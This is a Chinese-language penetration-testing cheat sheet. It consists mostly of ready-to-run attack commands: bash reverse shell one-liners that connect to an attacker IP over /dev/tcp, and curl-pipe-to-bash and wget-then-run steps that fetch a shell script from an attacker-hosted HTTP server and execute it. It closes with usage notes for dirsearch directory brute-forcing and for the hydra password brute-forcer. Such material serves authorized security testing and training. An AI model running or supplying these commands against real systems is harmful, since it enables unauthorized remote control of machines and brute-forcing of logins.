## 反弹Shell

### bash

```
bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
```

### curl

攻击方：

```bash
cat bash.html
/bin/bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
```

被控端：

```
curl 192.168.35.152/bash.html|bash
```

### http

攻击方：

```bash
# 编写shell脚本并启动http服务器
echo "bash -i >& /dev/tcp/192.168.35.152/7777 0>&1" > shell.sh
python2环境下：python -m SimpleHTTPServer 80
python3环境下：python -m http.server 80
```

被控端：

```bash
# 上传shell.sh文件
wget 192.168.35.152/shell.sh
# 执行shell.sh文件
bash shell.sh
```

### dirsearch

```
# 选项
-u 目标
-e 文件扩展名
-x 排除状态码结果
-w 指定字典
-r 递归扫描
-R 设置递归级别
-t 设置线程数（50-100）
-c cookie
```

```python
# 默认字典
python3 dirsearch.py -u https://target -x 403
```

```python
# 自定义字典
python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist

# -w指定一个字典，若其中的字符串没有后缀，可以通过--suffixes进行添加
python3 dirsearch.py -u https://target -w /path/to/wordlist --suffixes=.php.bak
```

```python
# 配置代理
python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080

python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://1.1.1.1:8080
```

```python
# 排除404
python3 dirsearch.py -u https://target -u 404
```

### hydra

```
# 选项
-l 指定的用户名 -L 用户名字典
-p 指定密码 -P 密码字典
-s 指定端口 
-e ns 空密码试探

-t 任务数默认16
-f 爆破成功一个就停止
-v 报错日志详细 -V 攻击日志
```
